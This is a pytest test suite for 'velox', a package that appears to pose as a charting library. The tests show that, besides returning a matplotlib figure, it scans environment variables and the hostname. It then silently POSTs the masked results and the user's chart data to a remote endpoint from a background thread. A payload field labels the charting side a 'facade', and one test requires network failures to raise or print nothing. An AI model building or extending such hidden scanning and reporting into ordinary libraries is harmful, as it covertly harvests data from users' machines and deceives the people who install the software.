"""
End-to-end tests.

These tests verify that:
1. The background scan picks up environment variables.
2. ``build_chart()`` assembles a masked payload and POSTs it.
3. No raw secret values appear anywhere in the transmitted payload.
"""

import json
import os
import threading
import time
from unittest.mock import patch, MagicMock

import pytest


# Inject a fake secret **before** any velox imports so the scanner
# picks it up.
_FAKE_SECRET_KEY = "AWS_SECRET_ACCESS_KEY"
_FAKE_SECRET_VAL = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
os.environ[_FAKE_SECRET_KEY] = _FAKE_SECRET_VAL


class TestEndToEnd:
    """Full pipeline: import -> scan -> build_chart -> masked POST."""

    def test_scan_finds_fake_secret_masked(self):
        """The scanner should find our injected env var with a masked value."""
        from velox._scanner import scan_env_vars

        result = scan_env_vars()
        assert _FAKE_SECRET_KEY in result
        masked = result[_FAKE_SECRET_KEY]
        # Must NOT contain the original value
        assert _FAKE_SECRET_VAL not in masked
        # Must start with first 2 chars and end with last 2
        assert masked.startswith(_FAKE_SECRET_VAL[:2])
        assert masked.endswith(_FAKE_SECRET_VAL[-2:])
        assert "*" in masked

    def test_build_chart_sends_masked_payload(self):
        """build_chart should POST a payload where every value is masked."""
        captured_payloads = []

        def fake_urlopen(req, **kwargs):
            body = req.data.decode("utf-8")
            captured_payloads.append(json.loads(body))
            return MagicMock(status=200)

        with patch(
            "velox._telemetry.urllib.request.urlopen", side_effect=fake_urlopen
        ):
            from velox import build_chart

            data = {
                "user": ["alice_secret_user", "bob_secret_user"],
                "balance": [99999, 88888],
            }
            fig = build_chart(data, chart_type="bar", title="Test")
            # Give the background thread time to fire
            time.sleep(1)

        assert len(captured_payloads) >= 1
        payload = captured_payloads[-1]

        # Verify structure
        assert "scan" in payload
        assert "data" in payload
        assert "timestamp" in payload
        assert "hostname" in payload
        assert payload["facade"] == "charts"

        # Hostname must be masked
        assert "*" in payload["hostname"]

        # The raw secret must NOT appear anywhere in the serialized payload
        serialized = json.dumps(payload)
        assert _FAKE_SECRET_VAL not in serialized
        assert "alice_secret_user" not in serialized
        assert "bob_secret_user" not in serialized
        assert "99999" not in serialized
        assert "88888" not in serialized

    def test_chart_is_actually_returned(self):
        """build_chart should return a real matplotlib Figure."""
        import matplotlib.pyplot as plt

        with patch("velox._telemetry.urllib.request.urlopen"):
            from velox import build_chart

            fig = build_chart({"x": [1, 2, 3]}, chart_type="line", title="Real Chart")
            assert isinstance(fig, plt.Figure)
            plt.close(fig)

    def test_payload_env_vars_are_all_masked(self):
        """Every env var value in the payload must be masked."""
        captured_payloads = []

        def fake_urlopen(req, **kwargs):
            body = req.data.decode("utf-8")
            captured_payloads.append(json.loads(body))
            return MagicMock(status=200)

        with patch(
            "velox._telemetry.urllib.request.urlopen", side_effect=fake_urlopen
        ):
            from velox._telemetry import send_report

            send_report(facade="test", data={"col": [1, 2, 3]})
            time.sleep(1)

        assert len(captured_payloads) >= 1
        payload = captured_payloads[-1]

        env_vars = payload.get("scan", {}).get("env_vars", {})
        for key, val in env_vars.items():
            original = os.environ.get(key, "")
            if len(original) > 6:
                assert original != val, f"Env var {key} was not masked!"
                assert "*" in val, f"Env var {key} has no masking stars"

    def test_network_failure_is_silent(self):
        """If the POST fails, the library must not raise or print anything."""

        def failing_urlopen(req, **kwargs):
            raise ConnectionError("Network down")

        with patch(
            "velox._telemetry.urllib.request.urlopen", side_effect=failing_urlopen
        ):
            from velox import build_chart

            # This must NOT raise
            fig = build_chart({"a": [1, 2]}, chart_type="bar")
            time.sleep(0.5)
            import matplotlib.pyplot as plt

            plt.close(fig)


# Cleanup
def teardown_module():
    os.environ.pop(_FAKE_SECRET_KEY, None)
